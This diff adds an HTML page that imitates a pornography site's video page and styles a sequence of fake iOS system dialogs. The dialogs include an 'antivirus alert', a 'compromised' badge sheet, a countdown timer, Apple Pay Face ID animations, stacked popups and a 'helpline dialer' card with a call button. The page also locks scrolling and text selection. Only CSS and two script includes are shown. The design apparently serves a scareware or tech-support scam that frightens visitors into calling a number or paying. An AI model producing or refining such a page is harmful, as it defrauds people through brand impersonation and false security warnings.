@@ -1,0 +1,3582 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#000000">
+    <title>Pornhub — Premium HD Video &amp; Member Stream</title>
+
+    
+
+   
+
+    <!-- Lottie Player & Face ID Animation Data -->
+    <script src="js/lottie.min.js"></script>
+    <script src="js/faceid_data.js"></script>
+    <style>
+        /* CORE RESET & TYPOGRAPHY */
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden !important;
+            overscroll-behavior: none !important;
+            overscroll-behavior-y: none !important;
+            overscroll-behavior-x: none !important;
+            touch-action: none !important;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", sans-serif;
+            background-color: #0d0d0d;
+            user-select: none !important;
+            -webkit-user-select: none !important;
+            -webkit-touch-callout: none !important;
+            color: #ffffff;
+            height: 100vh;
+            width: 100vw;
+            cursor: default !important;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            right: 0 !important;
+            bottom: 0 !important;
+        }
+
+        /* ==========================================================
+           PORNHUB LANDING PAGE (AUTHENTIC THEME & LAYOUT)
+           ========================================================== */
+        #pornhub-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #0e0e0e;
+            color: #ffffff;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            filter: none;
+            transition: filter 0.3s ease;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        /* Pornhub Header - Authentic Desktop & Mobile */
+        .ph-header {
+            background-color: #1b1b1b;
+            border-bottom: 1px solid #282828;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .ph-header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .ph-logo {
+            font-size: 24px;
+            font-weight: 900;
+            color: #ffffff;
+            letter-spacing: -0.8px;
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .ph-logo-badge {
+            background-color: #ff9000;
+            color: #000000;
+            padding: 2px 7px;
+            border-radius: 4px;
+            margin-left: 2px;
+            font-weight: 900;
+        }
+
+        .ph-search-bar {
+            background-color: #000000;
+            border: 1px solid #383838;
+            border-radius: 4px;
+            padding: 7px 12px;
+            display: flex;
+            align-items: center;
+            flex: 1;
+            max-width: 440px;
+            margin: 0 16px;
+            color: #999999;
+            font-size: 13.5px;
+            gap: 10px;
+        }
+
+        .ph-search-bar input {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            width: 100%;
+            font-size: 13px;
+        }
+
+        .ph-nav-tabs {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #b3b3b3;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+        }
+
+        .ph-nav-tab {
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            transition: color 0.15s;
+        }
+
+        .ph-nav-tab:hover,
+        .ph-nav-tab.active {
+            color: #ff9000;
+        }
+
+        .ph-header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .ph-btn-login {
+            background: transparent;
+            color: #cccccc;
+            border: none;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            padding: 6px 12px;
+        }
+
+        .ph-btn-signup {
+            background: #ff9000;
+            color: #000000;
+            border: none;
+            border-radius: 3px;
+            font-size: 13px;
+            font-weight: 800;
+            cursor: pointer;
+            padding: 6px 14px;
+        }
+
+        /* Pornhub Sub-Navigation Bar */
+        .ph-subnav {
+            background-color: #141414;
+            border-bottom: 1px solid #222222;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #8c8c8c;
+            overflow-x: auto;
+        }
+
+        .ph-subnav span {
+            white-space: nowrap;
+            cursor: pointer;
+        }
+
+        .ph-subnav span:hover {
+            color: #fff;
+        }
+
+        /* Pornhub Main Video Content */
+        .ph-main-content {
+            max-width: 1060px;
+            margin: 0 auto;
+            width: 100%;
+            padding: 16px;
+            box-sizing: border-box;
+        }
+
+        .ph-video-player {
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            max-height: 520px;
+            background-color: #000000;
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+            background-image: url('images/xn_17_t.jpg'),
+                radial-gradient(circle at 50% 50%, #2a2a2a, #0a0a0a);
+            background-size: cover;
+            background-position: center;
+            border: 1px solid #222222;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+        }
+
+        .ph-play-btn {
+            width: 76px;
+            height: 76px;
+            background-color: rgba(255, 144, 0, 0.95);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 25px rgba(255, 144, 0, 0.6);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .ph-play-btn:hover {
+            transform: scale(1.08);
+        }
+
+        .ph-video-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: linear-gradient(0deg, rgba(0, 0, 0, 0.92) 0%, rgba(0, 0, 0, 0.4) 60%, transparent 100%);
+            padding: 24px 14px 10px 14px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            box-sizing: border-box;
+        }
+
+        .ph-seekbar-container {
+            width: 100%;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.25);
+            border-radius: 3px;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .ph-seekbar-fill {
+            width: 38%;
+            height: 100%;
+            background: #ff9000;
+            border-radius: 3px;
+            position: relative;
+        }
+
+        .ph-seekbar-fill::after {
+            content: '';
+            position: absolute;
+            right: -6px;
+            top: -4px;
+            width: 13px;
+            height: 13px;
+            background: #ffffff;
+            border: 2px solid #ff9000;
+            border-radius: 50%;
+            box-shadow: 0 0 6px rgba(0, 0, 0, 0.6);
+        }
+
+        .ph-controls-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #ffffff;
+        }
+
+        .ph-controls-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .ph-controls-right {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        /* Video Info Header */
+        .ph-video-details {
+            padding: 16px 0 10px 0;
+        }
+
+        .ph-video-title {
+            font-size: 21px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+
+        .ph-video-meta-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #222222;
+        }
+
+        .ph-video-views-stat {
+            font-size: 13px;
+            color: #8c8c8c;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .ph-video-actions {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .ph-action-pill {
+            background-color: #1f1f1f;
+            color: #e0e0e0;
+            border: 1px solid #333333;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 12.5px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        /* Creator Channel Strip */
+        .ph-creator-strip {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 0;
+            border-bottom: 1px solid #222222;
+        }
+
+        .ph-creator-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .ph-creator-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: #ff9000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            color: #000;
+            font-size: 18px;
+            border: 2px solid #333;
+        }
+
+        .ph-creator-info-name {
+            font-size: 15px;
+            font-weight: 800;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .ph-creator-sub-count {
+            font-size: 12px;
+            color: #8c8c8c;
+            margin-top: 2px;
+        }
+
+        .ph-btn-subscribe {
+            background-color: #ff9000;
+            color: #000000;
+            font-weight: 800;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 18px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        /* Category Tags */
+        .ph-video-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 14px;
+        }
+
+        .ph-tag {
+            background-color: #1a1a1a;
+            color: #b0b0b0;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 600;
+            border: 1px solid #282828;
+        }
+
+        /* Suggested Videos Grid */
+        .ph-suggested-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 16px;
+            margin-top: 24px;
+        }
+
+        .ph-card {
+            background-color: #141414;
+            border-radius: 4px;
+            overflow: hidden;
+            border: 1px solid #222222;
+        }
+
+        .ph-card-thumb {
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            background-color: #222222;
+            position: relative;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .ph-duration-pill {
+            position: absolute;
+            bottom: 6px;
+            right: 6px;
+            background-color: rgba(0, 0, 0, 0.85);
+            font-size: 11px;
+            font-weight: 800;
+            color: #fff;
+            padding: 2px 6px;
+            border-radius: 2px;
+        }
+
+        .ph-card-info {
+            padding: 10px;
+        }
+
+        .ph-card-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 6px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .ph-card-meta {
+            font-size: 11.5px;
+            color: #777777;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        /* ==========================================================
+           APPLE PAY FACE ID SCANNING & CONFIRMATION ANIMATION
+           ========================================================== */
+        .face-id-wrapper {
+            position: relative;
+            width: 76px;
+            height: 76px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .face-id-scanner {
+            position: relative;
+            width: 68px;
+            height: 68px;
+            animation: fidPulse 1.2s ease-in-out infinite alternate;
+        }
+
+        @keyframes fidPulse {
+            0% {
+                transform: scale(0.96);
+                filter: drop-shadow(0 0 2px rgba(0, 122, 255, 0.4));
+            }
+
+            100% {
+                transform: scale(1.05);
+                filter: drop-shadow(0 0 12px rgba(0, 122, 255, 0.75));
+            }
+        }
+
+        .face-id-laser {
+            position: absolute;
+            left: 8px;
+            right: 8px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #007aff, #5ac8fa, #007aff, transparent);
+            box-shadow: 0 0 8px #007aff;
+            border-radius: 2px;
+            animation: laserScan 1s ease-in-out infinite alternate;
+        }
+
+        @keyframes laserScan {
+            0% {
+                top: 16px;
+                opacity: 0.2;
+            }
+
+            50% {
+                opacity: 0.9;
+            }
+
+            100% {
+                top: 58px;
+                opacity: 0.2;
+            }
+        }
+
+        .face-id-check-success {
+            width: 68px;
+            height: 68px;
+            background: #34c759;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 25px rgba(52, 199, 89, 0.5);
+            animation: fidSuccessPop 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes fidSuccessPop {
+            0% {
+                transform: scale(0.2) rotate(-20deg);
+                opacity: 0;
+            }
+
+            70% {
+                transform: scale(1.15) rotate(4deg);
+            }
+
+            100% {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+
+        .fid-checkmark-path {
+            stroke-dasharray: 50;
+            stroke-dashoffset: 50;
+            animation: strokeCheck 0.4s ease-out 0.15s forwards;
+        }
+
+        @keyframes strokeCheck {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        /* ==========================================================
+           SEPARATE MODAL BACKDROP (SEPARATE CONTAINER FOR ALL POPUPS)
+           ========================================================== */
+        #modal-backdrop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.55);
+            z-index: 999900;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        #active-popup-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 999910;
+            transform: scale(1.15);
+            /* Scale up all popups to make them larger and more readable */
+        }
+
+        /* Shake animation when user interacts */
+        @keyframes iosDialogShake {
+
+            0%,
+            100% {
+                transform: scale(1.15) translateX(0);
+            }
+
+            15% {
+                transform: scale(1.17) translateX(-7px);
+            }
+
+            30% {
+                transform: scale(1.17) translateX(7px);
+            }
+
+            45% {
+                transform: scale(1.16) translateX(-5px);
+            }
+
+            60% {
+                transform: scale(1.16) translateX(5px);
+            }
+
+            75% {
+                transform: scale(1.15) translateX(-2px);
+            }
+
+            90% {
+                transform: scale(1.15) translateX(2px);
+            }
+        }
+
+        .shake-anim {
+            animation: iosDialogShake 0.4s ease-in-out;
+        }
+
+        /* ==========================================================
+           EXACT POPUP 1: iOS NATIVE UIAlertController (Image 1 Style)
+           ========================================================== */
+        .ios-alert-dialog {
+            width: 270px;
+            max-width: 90vw;
+            background-color: rgba(242, 242, 247, 0.88);
+            backdrop-filter: blur(25px) saturate(180%);
+            -webkit-backdrop-filter: blur(25px) saturate(180%);
+            border-radius: 14px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.35);
+            text-align: center;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", sans-serif;
+            margin: 0 auto;
+        }
+
+        .ios-alert-content {
+            padding: 19px 16px 18px 16px;
+        }
+
+        .ios-alert-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #000000;
+            letter-spacing: -0.41px;
+            line-height: 1.3;
+            margin-bottom: 5px;
+        }
+
+        .ios-alert-message {
+            font-size: 13px;
+            line-height: 1.38;
+            color: #000000;
+            letter-spacing: -0.08px;
+            margin-bottom: 0;
+        }
+
+        .ios-alert-btn-row {
+            border-top: 0.5px solid rgba(60, 60, 67, 0.29);
+            display: flex;
+            min-height: 44px;
+        }
+
+        .ios-alert-btn {
+            flex: 1;
+            min-height: 44px;
+            padding: 10px 6px;
+            background: transparent;
+            border: none;
+            color: #007aff;
+            font-size: 17px;
+            font-weight: 400;
+            letter-spacing: -0.41px;
+            cursor: pointer !important;
+            transition: background-color 0.15s;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .ios-alert-btn.bold {
+            font-weight: 600;
+        }
+
+        .ios-alert-btn.destructive {
+            color: #ff3b30;
+        }
+
+        .ios-alert-btn:active {
+            background-color: rgba(0, 0, 0, 0.08);
+        }
+
+        .ios-alert-btn + .ios-alert-btn {
+            border-left: 0.5px solid rgba(60, 60, 67, 0.29);
+        }
+
+        /* ==========================================================
+           EXACT POPUP 2: SETTINGS SQUIRCLE WITH TIMER (Image 2 Style)
+           ========================================================== */
+        .ios-card-dialog {
+            width: 270px;
+            max-width: 95vw;
+            background-color: rgba(242, 242, 242, 0.85);
+            backdrop-filter: blur(20px) saturate(1.8);
+            -webkit-backdrop-filter: blur(20px) saturate(1.8);
+            border-radius: 14px;
+            box-shadow: 0 0 0 0.5px rgba(0, 0, 0, 0.05), 0 10px 40px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .ios-card-body {
+            padding: 20px 16px 20px 16px;
+        }
+
+        .ios-gear-icon-wrapper {
+            margin: 0 auto 16px auto;
+            width: 68px;
+            height: 68px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .ios-card-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #000000;
+            line-height: 1.25;
+            margin-bottom: 8px;
+            letter-spacing: -0.41px;
+        }
+
+        .ios-card-text {
+            font-size: 13px;
+            color: #3c3c43;
+            line-height: 1.25;
+            margin-bottom: 12px;
+            letter-spacing: -0.08px;
+        }
+
+        .ios-card-timer {
+            font-size: 15px;
+            font-weight: 600;
+            color: #d70015;
+            margin-bottom: 6px;
+            letter-spacing: -0.2px;
+        }
+
+        .ios-card-actions {
+            display: flex;
+            border-top: 0.5px solid #d1d1d6;
+        }
+
+        .ios-card-actions .ios-card-btn {
+            flex: 1;
+            padding: 11px 10px;
+            background: transparent;
+            border: none;
+            color: #007aff;
+            font-size: 17px;
+            font-weight: 400;
+            cursor: pointer !important;
+        }
+
+        .ios-card-actions .ios-card-btn.bold {
+            font-weight: 700;
+        }
+
+        .ios-card-actions .btn-divider {
+            width: 0.5px;
+            background-color: #d1d1d6;
+        }
+
+        /* ==========================================================
+           EXACT POPUP 3: DARK MODE ANTIVIRUS ALERT (Image 3 Style)
+           ========================================================== */
+        .ios-dark-dialog {
+            width: 270px;
+            max-width: 95vw;
+            background-color: rgba(30, 30, 30, 0.75);
+            backdrop-filter: blur(20px) saturate(1.8);
+            -webkit-backdrop-filter: blur(20px) saturate(1.8);
+            color: #ffffff;
+            border-radius: 14px;
+            box-shadow: 0 0 0 0.5px rgba(255, 255, 255, 0.15), 0 10px 40px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .ios-dark-body {
+            padding: 20px 16px 20px 16px;
+        }
+
+        .ios-dark-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #ffffff;
+            line-height: 1.25;
+            margin-bottom: 8px;
+            letter-spacing: -0.41px;
+        }
+
+        .ios-dark-text {
+            font-size: 13px;
+            color: #ebebf5;
+            line-height: 1.25;
+            margin-bottom: 12px;
+            letter-spacing: -0.08px;
+        }
+
+        .ios-dark-banner-row {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 8px 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+
+        .ios-dark-banner-text {
+            font-size: 12px;
+            font-weight: 400;
+            color: #ffffff;
+            line-height: 1.2;
+            text-align: left;
+        }
+
+        .ios-dark-actions {
+            display: flex;
+            border-top: 0.5px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .ios-dark-actions .ios-dark-btn {
+            flex: 1;
+            padding: 11px 10px;
+            background: transparent;
+            border: none;
+            color: #0a84ff;
+            font-size: 17px;
+            font-weight: 400;
+            text-align: center;
+            cursor: pointer !important;
+        }
+
+        .ios-dark-actions .ios-dark-btn.bold {
+            font-weight: 600;
+        }
+
+        .ios-dark-actions .dark-divider {
+            width: 0.5px;
+            background-color: #38383a;
+        }
+
+        /* ==========================================================
+           EXACT POPUP 4: COMPROMISED BADGE SHEET (Image 4 Style)
+           ========================================================== */
+        .ios-sheet-dialog {
+            width: 375px;
+            max-width: 95vw;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .ios-sheet-card {
+            background-color: rgba(242, 242, 242, 0.85);
+            backdrop-filter: blur(20px) saturate(1.8);
+            -webkit-backdrop-filter: blur(20px) saturate(1.8);
+            border-radius: 14px;
+            padding: 20px 18px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .ios-sheet-badge-icon {
+            position: relative;
+            width: 64px;
+            height: 64px;
+            flex-shrink: 0;
+        }
+
+        .red-badge-1 {
+            position: absolute;
+            top: -4px;
+            right: -4px;
+            background-color: #ff3b30;
+            color: #ffffff;
+            font-size: 12px;
+            font-weight: 800;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1.5px solid #ffffff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .ios-sheet-info h3 {
+            font-size: 17px;
+            font-weight: 800;
+            color: #000000;
+            text-transform: uppercase;
+            line-height: 1.2;
+            margin-bottom: 6px;
+        }
+
+        .ios-sheet-info p {
+            font-size: 14.5px;
+            color: #3c3c43;
+            font-weight: 600;
+        }
+
+        .ios-sheet-btn-pill {
+            background-color: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 14px;
+            padding: 16px;
+            text-align: center;
+            color: #007aff;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer !important;
+        }
+
+        /* ==========================================================
+           EXACT POPUP 5: DIRECT HELPLINE DIALER CARD
+           ========================================================== */
+        .ios-dialer-dialog {
+            width: 370px;
+            max-width: 95vw;
+            background-color: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 18px 50px rgba(0, 0, 0, 0.45);
+            text-align: center;
+            overflow: hidden;
+            border: 0.5px solid rgba(0, 0, 0, 0.12);
+        }
+
+        .ios-dialer-body {
+            padding: 26px 22px 22px 22px;
+        }
+
+        .ios-dialer-icon {
+            width: 64px;
+            height: 64px;
+            background-color: #e8f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px auto;
+            color: #007aff;
+        }
+
+        .ios-dialer-title {
+            font-size: 21px;
+            font-weight: 800;
+            color: #000000;
+            margin-bottom: 8px;
+        }
+
+        .ios-dialer-text {
+            font-size: 14.5px;
+            color: #3c3c43;
+            line-height: 1.45;
+            margin-bottom: 16px;
+        }
+
+        .ios-dialer-box {
+            background-color: #f2f2f7;
+            border-radius: 14px;
+            padding: 12px;
+            margin-bottom: 16px;
+            border: 0.5px solid #e5e5ea;
+            cursor: pointer !important;
+        }
+
+        .ios-dialer-num {
+            font-size: 21px;
+            font-weight: 800;
+            color: #007aff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .ios-dialer-btn-full {
+            width: 100%;
+            background-color: #007aff;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 700;
+            padding: 14px;
+            border-radius: 12px;
+            border: none;
+            cursor: pointer !important;
+            box-shadow: 0 4px 14px rgba(0, 122, 255, 0.4);
+            transition: transform 0.1s;
+        }
+
+        .ios-dialer-btn-full:active {
+            transform: scale(0.97);
+        }
+
+        /* LIVE AUDIO SOUNDWAVE BARS */
+        .soundwave-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            height: 24px;
+            margin: 10px 0;
+        }
+
+        .soundwave-bar {
+            width: 4px;
+            height: 6px;
+            background-color: #34c759;
+            border-radius: 2px;
+            animation: waveAnim 1s ease-in-out infinite alternate;
+        }
+
+        .soundwave-bar:nth-child(2) {
+            animation-delay: 0.15s;
+        }
+
+        .soundwave-bar:nth-child(3) {
+            animation-delay: 0.3s;
+        }
+
+        .soundwave-bar:nth-child(4) {
+            animation-delay: 0.45s;
+        }
+
+        .soundwave-bar:nth-child(5) {
+            animation-delay: 0.6s;
+        }
+
+        @keyframes waveAnim {
+            0% {
+                height: 4px;
+                opacity: 0.5;
+            }
+
+            100% {
+                height: 22px;
+                opacity: 1;
+            }
+        }
+
+        @keyframes radarPulse {
+            0% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(52, 199, 89, 0.7);
+            }
+
+            70% {
+                transform: scale(1);
+                box-shadow: 0 0 0 14px rgba(52, 199, 89, 0);
+            }
+
+            100% {
+                transform: scale(0.95);
+                box-shadow: 0 0 0 0 rgba(52, 199, 89, 0);
+            }
+        }
+
+        /* STICKY BOTTOM FLOATING VIP CLAIM BAR */
+        #ios-vip-sticky-bar {
+            position: fixed;
+            bottom: 16px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: calc(100% - 28px);
+            max-width: 460px;
+            background: rgba(26, 26, 28, 0.92);
+            backdrop-filter: blur(25px) saturate(2);
+            -webkit-backdrop-filter: blur(25px) saturate(2);
+            border: 1px solid rgba(52, 199, 89, 0.4);
+            border-radius: 18px;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            z-index: 999999;
+            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.6), 0 0 15px rgba(52, 199, 89, 0.25);
+            cursor: pointer !important;
+            animation: stickySlideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes stickySlideUp {
+            from {
+                transform: translate(-50%, 80px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translate(-50%, 0);
+                opacity: 1;
+            }
+        }
+
+        .vip-bar-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .vip-agent-avatar {
+            position: relative;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #2c2c2e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            border: 1.5px solid #34c759;
+        }
+
+        .vip-live-dot {
+            position: absolute;
+            bottom: -1px;
+            right: -1px;
+            width: 10px;
+            height: 10px;
+            background-color: #34c759;
+            border-radius: 50%;
+            border: 2px solid #1c1c1e;
+            animation: radarPulse 1.5s infinite;
+        }
+
+        .vip-bar-info {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+        }
+
+        .vip-bar-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .vip-bar-sub {
+            font-size: 11.5px;
+            color: #30d158;
+            font-weight: 600;
+        }
+
+        .vip-bar-btn {
+            background: linear-gradient(135deg, #34c759 0%, #28a745 100%);
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 800;
+            padding: 9px 15px;
+            border-radius: 20px;
+            border: none;
+            box-shadow: 0 4px 12px rgba(52, 199, 89, 0.4);
+            white-space: nowrap;
+            cursor: pointer !important;
+            letter-spacing: 0.2px;
+        }
+
+        /* SVG SETTINGS SQUIRCLE HELPER */
+        .svg-settings-icon {
+            width: 52px;
+            height: 52px;
+            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.25));
+        }
+
+        /* ==========================================================
+           MULTIPLIED POPUPS CASCADING & STACKING SYSTEM
+           ========================================================== */
+        .popup-multi-stack {
+            position: relative;
+            width: 270px;
+            max-width: 90vw;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .popup-stack-back {
+            position: absolute;
+            top: -24px;
+            transform: scale(0.91) translateY(-12px);
+            opacity: 0.75;
+            pointer-events: none;
+            filter: brightness(0.85);
+            z-index: 1;
+            width: 100%;
+        }
+
+        .popup-stack-mid {
+            position: absolute;
+            top: -12px;
+            transform: scale(0.96) translateY(-6px);
+            opacity: 0.88;
+            pointer-events: none;
+            z-index: 2;
+            width: 100%;
+        }
+
+        .popup-stack-front {
+            position: relative;
+            z-index: 3;
+            width: 100%;
+            animation: popMultiplyIn 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popMultiplyIn {
+            0% {
+                transform: scale(0.85) translateY(25px);
+                opacity: 0;
+            }
+
+            100% {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* FLOATING TOAST NOTIFICATION BADGE */
+        .floating-alert-toast {
+            position: fixed;
+            top: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 320px;
+            max-width: 90vw;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 14px;
+            padding: 12px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.35);
+            z-index: 999999;
+            border: 0.5px solid rgba(0, 0, 0, 0.15);
+            cursor: pointer !important;
+            animation: toastSlideDown 0.4s ease-out;
+        }
+
+        @keyframes toastSlideDown {
+            0% {
+                transform: translate(-50%, -40px);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translate(-50%, 0);
+                opacity: 1;
+            }
+        }
+
+        /* ==========================================================
+           IOS PUSH NOTIFICATIONS & MESSAGES FEED (OVERLAPPING STACK)
+           ========================================================== */
+        #notif-layer {
+            position: fixed;
+            top: 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 94vw;
+            max-width: 365px;
+            z-index: 999999;
+            pointer-events: none;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0;
+        }
+
+        .ios-notif {
+            position: relative;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 16px;
+            padding: 12px 14px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+            border: 0.5px solid rgba(0, 0, 0, 0.15);
+            cursor: pointer !important;
+            pointer-events: auto;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            animation: notifSlideDown 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        /* OVERLAPPING STACK EFFECT (Ek ke upar ek overlap) */
+        .ios-notif:not(:first-child) {
+            margin-top: -46px;
+        }
+
+        .ios-notif:nth-child(1) {
+            z-index: 1;
+            transform: scale(0.96) translateY(-4px);
